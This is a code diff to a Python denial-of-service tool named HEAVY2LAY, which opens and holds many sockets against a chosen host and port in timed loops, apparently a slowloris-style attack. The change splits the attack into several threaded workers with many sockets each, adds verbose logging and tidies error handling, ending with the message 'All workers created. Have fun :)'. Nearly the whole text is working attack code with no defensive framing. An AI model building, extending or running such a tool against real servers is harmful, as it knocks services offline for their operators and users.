@@ -12,18 +12,14 @@ import platform
 import ssl
 import config
 
-cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'
-cleanout = cleanout_lite
+# cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'
+# cleanout = cleanout_lite
+cleanout = '\x1b[K'
 
-cleanout_lite = ''
 windows = True if platform.system() == 'Windows' else False
 if windows:
     out.p('ATTENTION: You\'re running HEAVY2LAY on Windows. Animations and colors work incorrectly')
-    cleanout_lite = '                    '
-else:
-    cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'
 
-cleanout = cleanout_lite
 symbols = [
     '>>>>', ' >>>', '> >>', '>> >', '>>> '
 ]
@@ -51,26 +47,21 @@ parser.add_arg('sockets', '-s', xtype=parse.T_INT, default=100)
 parser.add_arg('https', '--https', xtype=parse.T_BOOL)
 parser.add_arg('sleeptime', '-S', xtype=parse.T_INT, default=15)
 parser.add_arg('webinterface', '-w', xtype=parse.T_BOOL, default=False)
+parser.add_arg('workers', '-W', xtype=parse.T_INT, default=5)
+parser.add_arg('verbose', '--verbose', xtype=parse.T_BOOL)
 args = parser.parse()
 
-stop = False
-animtext = 'Starting workers'
-animworks = True
-def dos(host, port, https, web, sockets, sleeptime):
-    global animtext, animworks, stop
-    stop = False
-    # web = False # TODO: DELETE OR COMMENT THIS LINE !!!
-    loop_amount = 0
-    animthread = threading.Thread(target=animation)
-    if not web:
-        animthread.start()
-    else:
-        out.info(f'Starting attack to {host}:{port}')
+out.use_verbose = args['verbose']
+
+def worker(workernum, host, port, https, web, sockets, sleeptime):
     sleeping = -1
     alive_sockets = []
     refused = 0
+    loop_amount = 0
     while True:
-        if stop: out.warn(config.msg_http_stop); break
+        if stop:
+            out.warn(config.msg_http_stop)
+            break
         stop_creating = False
         try:
             if sleeping == -1:
@@ -80,7 +71,8 @@ def dos(host, port, https, web, sockets, sleeptime):
                     out.info(f'LOOP #{loop_amount}')
                 for _ in range(sockets):
                     if stop: out.warn(config.msg_http_stop); break
-                    animtext = f'CREATING WORKER {_+1}/{sockets}{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
+                    animtext = f'CREATING SOCKET {_+1}/{sockets}{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
+                    out.verbose(f"Creating socket {_+1}/{sockets} w{workernum}")
                     if stop_creating == False:
                         try:
                             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,25 +93,19 @@ def dos(host, port, https, web, sockets, sleeptime):
                         try:
                             sock.connect((host, port))
                         except ConnectionRefusedError:
-                            out.error('Connection Refused')
+                            out.error(f'Connection Refused{cleanout}', left='\r')
                             refused += 1
                             # animtext = f'CONNECTION REFUSED ERROR CATCHED ON WORKER {_+1}/{args["sockets"]}'
+                            stop_creating = True
                             continue
-                        except TimeoutError:
-                            out.error(f'Time out{cleanout}{cleanout}', left='\r')
+                        except (TimeoutError, socket.timeout):
+                            out.error(f'Time out{cleanout}', left='\r')
                             sock.close()
                             stop_creating = True
                             refused += sockets - len(alive_sockets)
                             continue
-                        except socket.timeout:
-                            out.error(f'Time out{cleanout}{cleanout}', left='\r')
-                            sock.close()
-                            stop_creating = True
-                            refused += sockets - len(alive_sockets)
-                            continue
-
                         except Exception as e:
-                            out.error(f'Exception: {e}                         ', left='\r')
+                            out.error(f'Exception: {e}{cleanout}', left='\r')
                             refused += 1
                             continue
                         alive_sockets.append(sock)
@@ -127,6 +113,7 @@ def dos(host, port, https, web, sockets, sleeptime):
                         if web: out.done(f"CREATED WORKER x{len(alive_sockets) + refused}")
                 sleeping = 0
                 donetext = 0
+                out.done(f"Sleeping w{workernum}")
                 if refused == 0:
                     donetext = '\x1b[42mDONE  '
                 elif refused > 0 and not len(alive_sockets) == 0:
@@ -140,18 +127,42 @@ def dos(host, port, https, web, sockets, sleeptime):
                 time.sleep(1)
                 sleeping += 1
                 if sleeping == sleeptime or stop:
-                    print(f'\r{donetext}\x1b[0m LOOP #{loop_amount} x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}')
+                    print(f'\r{donetext}\x1b[0m LOOP #{loop_amount} w{workernum} x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}')
                     sleeping = -1
                     alive_sockets = []
-        except KeyboardInterrupt:
-            animworks = False
-            i = 0
-            for sock in alive_sockets:
-                i += 1
-                animtext = f'Closing socket {i}/{len(alive_sockets)}'
-                sock.close()
-            out.warn('Keyboard Interrupt catched!                            ', left='\r')
-            sys.exit(0)
+        except Exception as e:
+            out.error(f"EXCEPTION: {e}")
+            sys.exit(1)
+            
+        # except KeyboardInterrupt:
+        #     animworks = False
+        #     i = 0
+        #     for sock in alive_sockets:
+        #         i += 1
+        #         animtext = f'Closing socket {i}/{len(alive_sockets)}'
+        #         sock.close()
+        #     out.warn(f'Keyboard Interrupt catched!{cleanout}', left='\r')
+        #     sys.exit(0)
+
+stop = False
+animtext = 'Starting workers'
+animworks = False # TODO: Enable or recreate animations
+def dos(host, port, https, web, sockets, sleeptime, workers):
+    global animtext, animworks, stop
+    stop = False
+    # loop_amount = 0
+    animthread = threading.Thread(target=animation)
+    if not web:
+        animthread.start()
+    else:
+        out.info(f'Starting attack to {host}:{port}')
+
+    alive_workers = []
+    for i in range(workers):
+        new_worker = threading.Thread(target=worker, args=(i, host, port, https, web, sockets, sleeptime,))
+        new_worker.start()
+        alive_workers.append(new_worker)
+    out.done("All workers created. Have fun :)")
 
 if args['help'] == True:
     out.p(config.msg_help)
@@ -205,4 +216,4 @@ if args['host'] == None:
 if args['port'] == None:
     args['port'] = 80 if not args['https'] else 443
 
-dos(args['host'], args['port'], https=args['https'], web=args['webinterface'], sockets=args['sockets'], sleeptime=args['sleeptime'])
+dos(args['host'], args['port'], https=args['https'], web=args['webinterface'], sockets=args['sockets'], sleeptime=args['sleeptime'], workers=args['workers'])
